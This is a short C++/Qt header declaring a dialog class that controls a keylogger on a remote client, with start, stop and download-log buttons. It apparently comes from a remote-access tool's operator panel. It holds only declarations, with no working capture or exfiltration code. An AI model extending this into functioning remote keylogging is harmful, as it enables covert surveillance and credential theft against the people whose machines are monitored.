#ifndef KEYLOGGERDIALOG_H
#define KEYLOGGERDIALOG_H

#include "ui_keyloggerdialog.h"
#include "../core/controllerbase.h"
#include "../common/Optional.h"

class AbstractClient;
class KeyloggerDialog : public ControllerBase, private Ui::KeyloggerDialog
{
    Q_OBJECT

    Optional<bool> _running{};
    Optional<QString> _fileName{};

public:
    explicit KeyloggerDialog(AbstractClient *client, QWidget *parent = nullptr);

protected:
    void changeEvent(QEvent *e);

private slots:
    void refreshUi();
    void enableUi();
    void on_pushButtonStart_clicked();
    void on_pushButtonStop_clicked();
    void on_pushButtonDownload_clicked();
};

#endif // KEYLOGGERDIALOG_H
